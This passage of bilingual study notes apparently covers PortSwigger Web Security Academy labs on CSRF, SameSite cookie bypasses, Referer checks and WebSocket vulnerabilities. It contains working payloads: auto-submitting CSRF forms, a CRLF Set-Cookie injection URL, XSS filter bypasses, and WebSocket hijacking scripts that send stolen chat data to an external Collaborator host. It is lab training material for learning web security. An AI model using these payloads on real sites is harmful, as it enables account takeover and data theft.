<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>email<span class="token path-separator">/</span>change</span></span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">68</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv</span></span>

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com</code></pre></li>
<li><p>The attacker can log in to the application using their own
account, obtain a valid token and associated cookie, leverage the
<code>cookie-setting behavior</code> to place their cookie into the
victim's browser, and feed their token to the victim in their CSRF
attack.</p></li>
</ol>
<h4 id="lab-csrf-where-token-is-tied-to-non-session-cookie">Lab: CSRF
where token is tied to non-session cookie</h4>
<ol type="1">
<li><p>csrfkey 未绑定session</p></li>
<li><p>注入cookie的恶意链接</p>
<pre class="language-http" data-language="http"><code class="language-http">/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None</code></pre>
<ol type="1">
<li>/?search= 表示调用搜索功能,search参数可控。</li>
<li>test%0d%0a 是无害的搜索词,对注入没有实际作用。</li>
<li>Set-Cookie: 表示开始注入cookie。</li>
<li>csrfKey=YOUR-KEY 是注入的cookie名称和值。</li>
<li>%3b%20SameSite=None 对cookie进行配置。</li>
<li>攻击者先在自己账号中获取合法的csrfKey cookie。</li>
<li>然后构造这个链接,将自己的cookie注入到受害者浏览器。</li>
<li>受害者访问链接会自动在浏览器保存这个cookie。</li>
<li>这样攻击者就可以绕过CSRF保护,因为浏览器会带上这个cookie访问站点。</li>
</ol></li>
<li><p>最终html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a79001e0472b581a144a43a002400c6.web-security-academy.net/my-account/change-email<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test3<span class="token entity" title="&#64;">&amp;#64;</span>gamil<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4zZPk7MTEJOt0hr9fuNakOScYLVOaHS4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a79001e0472b581a144a43a002400c6.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=SKs779vOfNH2Mof5bXp7M8jRsmqjnkg5%3b%20SameSite=None<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li>
</ol>
<h4 id="lab-csrf-where-token-is-duplicated-in-cookie">Lab: CSRF where
token is duplicated in cookie</h4>
<ol type="1">
<li>payload: note that csrf value within two positions are the same<img
src="https://s2.loli.net/2023/08/16/mkBytUGw62l4WMC.png"
alt="image-20230816072149480" />
<ol type="1">
<li>remember to delete<code>&lt;script&gt;</code> tag</li>
</ol></li>
</ol>
<h4 id="bypassing-samesite-cookie-restrictions">Bypassing SameSite
cookie restrictions</h4>
<ol type="1">
<li><p>What's the difference between a site and an origin?</p>
<table>
<colgroup>
<col style="width: 24%" />
<col style="width: 29%" />
<col style="width: 20%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Request from</strong></th>
<th><strong>Request to</strong></th>
<th><strong>Same-site?</strong></th>
<th><strong>Same-origin?</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>https://example.com</code></td>
<td><code>https://example.com</code></td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr class="even">
<td><code>https://app.example.com</code></td>
<td><code>https://intranet.example.com</code></td>
<td>Yes</td>
<td>No: mismatched domain name</td>
</tr>
<tr class="odd">
<td><code>https://example.com</code></td>
<td><code>https://example.com:8080</code></td>
<td>Yes</td>
<td>No: mismatched port</td>
</tr>
<tr class="even">
<td><code>https://example.com</code></td>
<td><code>https://example.co.uk</code></td>
<td>No: mismatched eTLD</td>
<td>No: mismatched domain name</td>
</tr>
<tr class="odd">
<td><code>https://example.com</code></td>
<td><code>http://example.com</code></td>
<td>No: mismatched scheme</td>
<td>No: mismatched scheme</td>
</tr>
</tbody>
</table></li>
</ol>
<h4 id="lab-samesite-lax-bypass-via-method-override">Lab: SameSite Lax
bypass via method override</h4>
<ol type="1">
<li><p>check request:no csrf token bu <code>SAMEORGIN</code>
exist</p></li>
<li><p>modify request method to <code>GET</code> and add
<code>_method</code> parameter<img
src="https://s2.loli.net/2023/08/16/DFGEtAR5WhP9T2d.png"
alt="image-20230816090515390" /></p></li>
<li><p>craft an exploit</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a6700a204464af4821c4dbb00cb0088.web-security-academy.net/my-account/change-email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token entity" title="&#64;">&amp;#64;</span>gmail<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token entity" title="&#95;">&amp;#95;</span>method<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
      history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 			document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"https://0a6700a204464af4821c4dbb00cb0088.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&amp;_method=POST"</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<ol type="1">
<li>attention:
<ol type="1">
<li>different email</li>
<li><code>script</code>:docunment.location</li>
</ol></li>
</ol></li>
</ol>
<h4 id="lab-samesite-strict-bypass-via-client-side-redirect">Lab:
SameSite Strict bypass via client-side redirect</h4>
<ol type="1">
<li>observe:<img
src="https://s2.loli.net/2023/08/16/1Qmkw9aNPnV78FZ.png"
alt="image-20230816102005808" /></li>
<li>paste following url in address bar<img
src="https://s2.loli.net/2023/08/16/jhOfduPDc4rHxn2.png"
alt="image-20230816102219219" />
<ol type="1">
<li>after a while:ridect <code>my-account</code> page</li>
</ol></li>
<li>test script<img
src="https://s2.loli.net/2023/08/16/mKXoH9zE3TM2VkW.png"
alt="image-20230816102318906" />
<ol type="1">
<li>view exploit: back to <code>my-account</code> page</li>
</ol></li>
<li>craft an exploit:<img
src="https://s2.loli.net/2023/08/16/LhDprHBE4q5K9OX.png"
alt="image-20230816102935833" />
<ol type="1">
<li>keep same email address within two positions</li>
<li>add <code>&amp;submit=1</code> to suffix
<ol type="1">
<li><code>&amp;</code> need urlcode as <code>postid</code>
vaule,otherwise the link will be terminated before
<code>submit</code></li>
</ol></li>
</ol></li>
</ol>
<hr />
<ol type="1">
<li>It's essential to keep in mind that a request can still be same-site
even if it's <strong>issued cross-origin</strong></li>
</ol>
<h4 id="lab-samesite-strict-bypass-via-sibling-domain">Lab: SameSite
Strict bypass via sibling domain</h4>
<ol type="1">
<li><p><del>necessary to complete <code>WebSockets</code> topic before
this</del></p></li>
<li><p>aim at:<strong>live chat</strong></p></li>
<li><p>Confirm the <code>CSWSH vulnerability</code></p>
<ol type="1">
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'wss://YOUR-LAB-ID.web-security-academy.net/chat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"READY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://YOUR-COLLABORATOR-PAYLOAD.oastify.com'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span> <span class="token literal-property property">body</span><span class="token operator">:</span> event<span class="token punctuation">.</span>data<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
<li><p>click <code>store &amp; view</code></p></li>
<li><p>in <code>proxy history</code>: noted that this
trigger<code>GET /chat</code> request but no cookie,so only exfiltrated
the chat history for <strong>a brand new session</strong></p></li>
</ol></li>
<li><p>request some <strong>resource file</strong>(like js or image),in
response:observe that <code>Access-Control-Allow-Origin</code> header
<img src="https://s2.loli.net/2023/08/17/KGey6hFPnHi7a31.png"
alt="image-20230817064307214" /></p></li>
<li><p>copy url,paste in browser<img
src="https://s2.loli.net/2023/08/17/RGp8KmbksYqDLfT.png"
alt="image-20230817064657141" /></p></li>
<li><p><code>Username</code> xss vulnerbility: convert <code>POST</code>
to GET ,confirmed still effective<img
src="https://s2.loli.net/2023/08/17/GF3OfkbpNeKVaQ1.png"
alt="image-20230817064740387" /></p></li>
<li><p>aim at xss:</p>
<ol type="1">
<li><p>username parameter: urlencode</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'wss://YOUR-LAB-ID.web-security-academy.net/chat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"READY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://YOUR-COLLABORATOR-PAYLOAD.oastify.com'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span> <span class="token literal-property property">body</span><span class="token operator">:</span> event<span class="token punctuation">.</span>data<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
<li><p>craft exploit</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
    document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&amp;password=anything"</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
</ol></li>
<li><p><code>store and deliver</code>, poll<img
src="https://s2.loli.net/2023/08/17/RYxG1HfwWbaI6DC.png"
alt="image-20230817065412116" /></p></li>
</ol>
<h4
id="bypassing-samesite-lax-restrictions-with-newly-issued-cookies">Bypassing
SameSite Lax restrictions with newly issued cookies</h4>
<ol type="1">
<li>to avoid breaking single sign-on (SSO) mechanisms, it doesn't
actually enforce these restrictions for the <strong>first 120
seconds</strong> on top-level <code>POST</code> requests. As a result,
there is a two-minute window in which users may be susceptible to
cross-site attacks.This can't suite the website that explicitly set with
the <code>SameSite=Lax</code></li>
</ol>
<h4 id="lab-samesite-lax-bypass-via-cookie-refresh">Lab: SameSite Lax
bypass via cookie refresh</h4>
<ol type="1">
<li><p>noted that if u want request: <strong>change email</strong>,this
will trigger another request<img
src="https://s2.loli.net/2023/08/17/QsYTeFAdx7BftaL.png"
alt="image-20230817074231027" /></p></li>
<li><p>Attempt a <code>CSRF attack</code></p>
<ol type="1">
<li><p>script</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
    history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"foo@bar.com"</span> <span class="token operator">/</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Submit request"</span> <span class="token operator">/</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
    document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
<li><p>if u complete if less than 2minutes,this will be
sucessful</p></li>
<li><p>find the <code>POST /my-account/change-email</code> request and
confirm that your session <strong>cookie</strong> was included even
though this is a cross-site <code>POST</code> request.</p></li>
</ol></li>
<li><p>In the browser, notice that if you visit
<code>/social-login</code>, this automatically initiates the full OAuth
flow. If you still have a logged-in session with the OAuth server, this
all happens without any interaction.</p>
<ol type="1">
<li><p>script</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"POST"</span> action<span class="token operator">=</span><span class="token string">"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"pwned@web-security-academy.net"</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
    window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/social-login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeEmail<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">changeEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
<li><p>Observe that the initial request <strong>gets blocked</strong> by
the browser's popup blocker.<img
src="https://s2.loli.net/2023/08/17/rKI58QtASFGCdfN.png"
alt="image-20230817074621992" /></p></li>
</ol></li>
<li><p>script</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"POST"</span> action<span class="token operator">=</span><span class="token string">"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"pwned@portswigger.net"</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
<span class="token operator">&lt;</span>p<span class="token operator">></span>Click anywhere on the page<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token comment">// !important</span>
    window<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/social-login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeEmail<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">changeEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
</ol>
<h4
id="lab-csrf-where-referer-validation-depends-on-header-being-present">Lab:
CSRF where Referer validation depends on header being present</h4>
<ol type="1">
<li>modify referer header: report error<img
src="https://s2.loli.net/2023/08/17/bGkQfTsig7dJxP6.png"
alt="image-20230817090913772" /></li>
<li>delete referer: response <code>302</code></li>
<li>generate PoC: add this line<img
src="https://s2.loli.net/2023/08/17/2NW1RnSuyIKF5de.png"
alt="image-20230817091054878" /></li>
</ol>
<h4 id="lab-csrf-with-broken-referer-validation">Lab: CSRF with broken
Referer validation</h4>
<ol type="1">
<li><p>as long as referer containts string required,<img
src="https://s2.loli.net/2023/08/17/QgmUVcwTsea5Bn6.png"
alt="image-20230817094046015" /></p>
<ol type="1">
<li><p>script</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"/?YOUR-LAB-ID.web-security-academy.net"</span><span class="token punctuation">)</span></code></pre>
<ol type="1">
<li>history.pushState是HTML5中新增的方法,可以修改浏览器历史状态。</li>
<li>第一个参数是标题,第二个是URL路径,第三个是状态对象。</li>
<li>这里设置了一个包含目标域的查询字符串作为状态对象。</li>
<li>当exploit中的表单被自动提交时,请求的Referer头会包含这个状态对象。</li>
<li>也就是请求会包含目标域作为查询字符串的Referer。</li>
<li>这样可以绕过服务端仅验证域的Referer校验。</li>
<li>让exploit对任意用户都能正常工作。</li>
</ol></li>
<li><p>many browsers now strip the query string from the Referer header
by default as a security measure. To override this behavior and ensure
that the full URL is included in the request, go back to the exploit
server and add the following header to the "Head" section:</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Referrer-Policy</span><span class="token punctuation">:</span> <span class="token header-value">unsafe-url</span></span></code></pre></li>
</ol></li>
</ol>
<h3 id="testing-for-websockets-security-vulnerabilities">Testing for
WebSockets security vulnerabilities</h3>
<h4 id="what-is-the-difference-between-http-and-websockets">What is the
difference between HTTP and WebSockets?</h4>
<ol type="1">
<li>WebSockets are particularly useful in situations where
<code>low-latency</code> or <code>server-initiated messages</code> are
required, such as <code>real-time feeds</code> of financial data</li>
</ol>
<h4
id="lab-manipulating-websocket-messages-to-exploit-vulnerabilities">Lab:
Manipulating WebSocket messages to exploit vulnerabilities</h4>
<ol type="1">
<li>in <strong>live chat</strong> function,intercept request</li>
<li>modify WebSocket message<img
src="https://s2.loli.net/2023/08/16/jODVoeldvSCEz4i.png"
alt="image-20230816113748837" /></li>
</ol>
<h4
id="lab-manipulating-the-websocket-handshake-to-exploit-vulnerabilities">Lab:
Manipulating the WebSocket handshake to exploit vulnerabilities</h4>
<ol type="1">
<li><p>detected attacked <img
src="https://s2.loli.net/2023/08/16/7ifa2qskETZLOzt.png"
alt="image-20230816115940712" /></p></li>
<li><p>and we can't reconnect:ip was banned</p></li>
<li><p>use <code>X-Forwarded-For</code> reconnect<img
src="https://s2.loli.net/2023/08/16/PMmEhI354Uiegvb.png"
alt="image-20230816120141846" /></p></li>
<li><p>payload: Case bypass</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">oNeRrOr</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span></span><span class="token punctuation">></span></span></code></pre></li>
</ol>
<h4 id="cross-site-websocket-hijacking">Cross-site WebSocket
hijacking</h4>
<h4 id="lab-cross-site-websocket-hijacking">Lab: Cross-site WebSocket
hijacking</h4>
<ol type="1">
<li><p>observe <code>ready</code> command is used to ready to
communicate <img
src="https://s2.loli.net/2023/08/17/T2oQyEJGHnpOxsc.png"
alt="image-20230817045525402" /></p></li>
<li><p>craft <code>script</code></p></li>
</ol>
<p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'wss://0a4500b303e6b1de81902fec00ed00d2.web-security-academy.net/chat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"READY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
